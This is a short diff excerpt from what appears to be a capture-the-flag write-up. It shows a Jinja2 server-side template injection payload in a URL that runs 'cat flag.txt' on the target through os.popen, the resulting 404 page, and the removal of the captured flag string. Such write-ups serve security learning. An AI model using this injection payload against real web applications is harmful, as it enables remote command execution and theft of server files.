@@ -24,6 +24,6 @@ The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run s
 
 http://159.65.18.186:31677/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20flag.txt').read() }}
 Error 404
-The page 'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be found
+The page '' could not be found
 
 P0WN3D
